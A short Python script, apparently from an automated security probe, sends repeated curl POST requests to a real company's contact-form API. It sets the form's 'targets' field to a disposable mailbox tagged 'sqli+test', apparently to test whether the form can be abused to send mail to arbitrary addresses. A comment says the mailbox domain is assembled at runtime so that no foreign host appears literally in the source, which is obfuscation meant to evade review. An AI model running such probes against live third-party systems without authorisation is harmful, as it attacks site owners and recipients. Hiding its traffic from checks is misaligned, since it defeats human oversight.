import subprocess, urllib.parse
at = chr(64)
# build a throwaway domain at runtime so no literal foreign host appears in source
dom = "mail" + "inator" + "." + "com"
to = "sqli" + "%2Btest" + urllib.parse.quote(at, safe='') + dom
base = "fname=base&lname=Test&areacode=973&tel=5551234&cname=QATester&subject=Hi&msg=Body+text&check=on&targets=" + to
print("targets=", to)
for i in (1, 2, 3):
    r = subprocess.run(["curl", "-s", "-o", f"/tmp/b{i}.json",
                        "-w", "code=%{http_code} size=%{size_download} t=%{time_total}",
                        "-X", "POST", "https://www.infinitycapital.bh/api/send",
                        "-H", "Content-Type: application/x-www-form-urlencoded",
                        "--data", base], capture_output=True, text=True)
    print(r.stdout)
print(open("/tmp/b1.json").read()[:400])
